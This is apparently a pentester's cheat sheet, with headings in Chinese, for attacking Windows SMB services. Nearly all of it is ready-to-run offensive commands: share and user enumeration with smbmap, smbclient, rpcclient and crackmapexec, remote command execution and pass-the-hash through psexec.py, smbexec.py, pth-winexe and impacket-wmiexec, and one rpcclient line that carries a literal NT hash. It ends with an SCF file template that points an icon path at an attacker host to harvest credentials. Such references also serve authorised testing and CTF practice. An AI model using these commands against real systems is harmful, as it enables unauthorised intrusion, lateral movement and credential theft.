### 信息枚举



List of SMB versions and corresponding Windows versions:
SMB1 – Windows 2000, XP and Windows 2003.
SMB2 – Windows Vista SP1 and Windows 2008
SMB2.1 – Windows 7 and Windows 2008 R2
SMB3 – Windows 8 and Windows 2012.




```bash
nmap -p139,445 --script smb-vuln* <IP>

enum4linux -a <IP>

smbmap -H <IP>
smbmap -d <DOMAIN> -u <USER> -p <PASSWORD> -H <IP>
smbmap -R <FOLDERNAME> -H <IP>
smbmap -u <USER> -p '<PASSWORD>' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H <IP>   # RCE
smbmap -H <IP> -R --depth 5 # 递归深度

smbclient -L <IP>
smbclient //<IP>/tmp
smbclient \\<IP>\IPC$ -U john
smbclient //MOUNT/ahare -l target -N
smbclient \\\\<IP>\\\\<SHARE>
smbclient -L -N -I <IP>
smbclient //<IP>/'Bob Share' --option='client min protocol=nt1'  # 降低协议版本
#Download all 递归下载
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory

rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash

crackmapexec smb <IP>
crackmapexec smb <IP> -u <USER> -p <PASS> --shares

psexec.py administrator@<IP>
smbexec.py <USER>@<IP> -hashes <NTLM>
pth-winexe -U <USER>%<NTLM>:<NTLM>
pth-winexe -U <USER> //<IP> cmd
impacket-wmiexec <USER>@<IP> -hashes <NTLM>:<NTLM>
impacket-wmiexec <DOMAIN>/<USER>:<NTLM>@<IP>
impacket-smbserver share `pwd`
winexe -U <USER> //<IP> "cmd.exe" --system
```


### rpcclient 参数

```bash
Users enumeration
    List users: querydispinfo and enumdomusers
    Get user details: queryuser <0xrid>
    Get user groups: queryusergroups <0xrid>
    GET SID of a user: lookupnames <username>
    Get users aliases: queryuseraliases [builtin|domain] <sid>
Groups enumeration
    List groups: enumdomgroups
    Get group details: querygroup <0xrid>
    Get group members: querygroupmem <0xrid>
Aliasgroups enumeration
    List alias: enumalsgroups <builtin|domain>
    Get members: queryaliasmem builtin|domain <0xrid>
Domains enumeration
    List domains: enumdomains
    Get SID: lsaquery
    Domain info: querydominfo
More SIDs
    Find SIDs by name: lookupnames <username>
    Find more SIDs: lsaenumsid
    RID cycling (check more SIDs): lookupsids <sid>
```

## SCF(Shell Command Files) file attack

```bash
[Shell]
Command=2
IconFile=\\<IP>\share\random.ico
[Taskbar]
Command=ToggleDesktop
```
